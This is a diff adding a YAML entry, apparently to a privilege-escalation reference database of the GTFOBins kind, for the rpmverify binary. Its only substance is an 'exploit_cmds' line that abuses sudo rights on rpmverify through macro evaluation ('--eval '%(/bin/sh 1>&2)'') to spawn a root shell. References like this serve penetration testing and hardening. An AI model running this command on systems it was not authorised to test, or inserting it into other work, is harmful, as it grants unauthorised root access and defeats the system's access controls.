@@ -1,0 +1,4 @@
+name: rpmverify
+binary_path: /usr/bin/rpmverify
+exploit_cmds:
+- sudo /usr/bin/rpmverify --eval '%(/bin/sh 1>&2)'
